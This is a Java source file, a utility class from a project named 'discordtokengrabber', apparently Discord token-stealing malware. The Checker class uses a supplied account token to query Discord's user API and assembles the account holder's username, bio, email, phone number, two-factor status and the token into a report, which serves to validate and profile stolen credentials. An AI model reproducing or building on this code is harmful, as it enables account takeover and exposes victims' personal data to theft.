package com.github.dedinc.discordtokengrabber.utils;

import org.json.JSONObject;

public class Checker {

    public String checkUser(String token) {
        JSONObject response = new JSONObject(Helper.getRequest().get("https://discordapp.com/api/v9/users/@me", token));
        String username = String.format("%s#%s", response.getString("username"), response.getString("discriminator"));
        return String.format("===User Info===\n\nUsername: %s\nBio: %s\nEmail: %s\nPhone: %s\n2FA: %b\n\nToken: %s", username, response.getString("bio"), response.getString("email"), response.getString("phone"), response.getBoolean("mfa_enabled"), token);
    }
}
